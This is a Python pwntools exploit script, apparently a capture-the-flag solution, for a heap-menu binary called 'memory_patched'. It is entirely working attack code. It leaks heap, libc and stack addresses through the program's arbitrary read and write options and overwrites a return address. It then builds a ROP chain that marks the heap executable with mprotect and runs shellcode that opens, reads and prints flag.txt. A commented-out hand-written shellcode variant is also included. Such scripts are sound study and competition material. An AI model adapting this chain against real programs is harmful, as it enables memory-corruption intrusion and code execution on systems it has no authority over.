#!/usr/bin/env python3

from pwn import *
from subprocess import check_output

exe = ELF('memory_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.arch = 'amd64'

info = lambda msg: log.info(msg)
mangle = lambda val, adrs: 	(adrs >> 12) ^ val

cmd=f'''
brva 0x1638 
brva 0x1696 
'''

def GDB():
    if args.DOCKER:
        gdb.attach(pid, exe=exe.path, 
            gdbscript=f"set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe\n" + cmd)
        pause()
    else:
        gdb.attach(p, gdbscript = cmd)
        input()

def allocate(size, data = b'A'):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'>> ', b'%d' % size)
    p.sendafter(b'>> ', data)
def free():
    p.sendlineafter(b'>> ', b'4')
def view():
    p.sendlineafter(b'>> ', b'5')
def write(addr, data):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'>> ', hex(addr))
    p.sendlineafter(b'>> ', hex(data))
def read(addr):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'>> ', hex(addr))

if args.REMOTE:
    p = remote('')
elif args.DOCKER:
    p = remote('')
else:
    p = process([exe.path])

allocate(0x100)
allocate(0x18, b'A')
view()
heap = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x2241
count = heap + 0x2a0
info('Heap base: ' + hex(heap))
info('Count ptr: ' + hex(count))
allocate(0x500)
write(count, 0xffffff9c)
read(heap+0x1990)
libc.address = int(p.recvline()[:-1], 16) - 0x1ecbf0
info('Libc base: ' + hex(libc.address))
read(libc.sym.environ)
stack = int(p.recvline()[:-1], 16)
ret_free = stack - 0x120
info('Stack addr: ' + hex(stack))
info('Return addr free: ' + hex(ret_free))
write(heap+0x20a0, ret_free)
write(heap+0x20a4, ret_free >> 32)

# sc = asm(
#     '''
#     xor rax, rax
#     push rax
#     mov rax, 8392585648256674918
#     push rax
#     mov rdi, rsp
#     xor rsi, rsi
#     mov rax, 0x2
#     xor rdx, rdx
#     syscall
#     mov rdi, rax
#     mov rsi, rsp
#     mov rdx, 0x20
#     mov rax, 0x0
#     syscall
#     mov rdi, 1
#     mov rdx, 0x20
#     mov rax, 0x1
#     syscall
#     ''', arch='amd64'
# )
sc = asm(shellcraft.open('flag.txt'))
sc += asm(shellcraft.read('rax', 'rsp', 100))
sc += asm(shellcraft.write(1, 'rsp', 100))
allocate(0xf0-8, sc)

pop_rax = libc.address + 0x47400
pop_rdi = libc.address + 0x23b72
pop_rsi = libc.address + 0x2604f
pop_rdx_r12 = libc.address + 0x119241
rop = ROP(libc)

syscall = rop.find_gadget(['syscall', 'ret'])
syscall = libc.address + 0x630d9
# GDB()
allocate(0xf0-8, p64(pop_rax) + p64(0x0a) + p64(pop_rdi) + p64(heap) + p64(pop_rsi) + p64(0x21000) + p64(pop_rdx_r12) + p64(7) + p64(0) + p64(syscall) + p64(heap+0x20a0))

p.interactive()
